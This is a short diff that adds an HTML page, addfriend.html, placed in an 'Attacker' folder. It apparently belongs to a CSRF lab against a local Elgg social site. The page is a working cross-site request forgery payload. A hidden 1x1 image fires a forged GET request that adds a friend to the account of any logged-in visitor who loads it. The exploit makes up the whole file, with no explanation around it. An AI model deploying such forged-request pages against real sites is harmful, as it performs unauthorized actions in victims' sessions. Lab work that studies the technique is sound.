@@ -1,0 +1,12 @@
+sudo gedit /var/www/CSRF/Attacker/addfriend.html
+<!-- addfriend.html -->
+<!doctype html>
+<html>
+ <head><meta charset="utf-8"><title>CSRF GET forge</title></head>
+ <body>
+ <h1>forges GET</h1>
+ <!-- small invisible image triggers GET request to add friend -->
+ <img src="http://www.csrflabelgg.com/action/friends/add?friend=43" width="1" height="1"
+alt="">
+ </body>
+</html>
